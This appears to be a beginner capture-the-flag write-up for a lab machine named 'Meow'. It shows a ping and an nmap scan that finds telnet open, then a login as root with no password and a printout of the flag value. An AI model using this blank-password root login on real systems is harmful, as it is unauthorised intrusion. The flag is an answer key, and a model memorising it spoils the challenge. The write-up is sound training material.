#### Machine info:
----
**Name:** Meow
**OS:** linux

#### Testing Connection
----
pinging over openVPN
```
❯ ping 10.129.41.170`
`PING 10.129.41.170 (10.129.41.170) 56(84) bytes of data.`
`64 bytes from 10.129.41.170: icmp_seq=1 ttl=63 time=284 ms`
`64 bytes from 10.129.41.170: icmp_seq=2 ttl=63 time=324 ms`
`64 bytes from 10.129.41.170: icmp_seq=3 ttl=63 time=347 ms`
`64 bytes from 10.129.41.170: icmp_seq=4 ttl=63 time=281 ms`
`^C`
`--- 10.129.41.170 ping statistics ---`
`4 packets transmitted, 4 received, 0% packet loss, time 3003ms`
`rtt min/avg/max/mdev = 281.236/309.275/347.101/27.681 ms
```

nmap scan
```
❯ nmap -sV -sC 10.129.41.170
Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-31 17:11 +0530
Nmap scan report for 10.129.41.170
Host is up (0.28s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.00 seconds
```

port 23/tcp running linux telnetd is open
(also got some weird error, irrelevant ig :v)

#### Connecting
----
Connected using telnet and logged in as root, no password for root lol
```
❯ telnet 10.129.41.170
Trying 10.129.41.170...
Connected to 10.129.41.170.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 31 Oct 2026 11:48:24 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             137
  Users logged in:       0
  IPv4 address for eth0: 10.129.41.170
  IPv6 address for eth0: dead:beef::a0de:adff:fe2a:4aab


75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 
```

tryna find flag
```
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# 
```
 that was easy

----
**Flag:** `b40abdfe23665f766f9c61ecba8a4c19`

#### Proof:
----
![[Hacktoberfest2026-Systems-and-Security-Challenges/level-4/Cybersecurity/sapph-h/meow/proof.jpg]]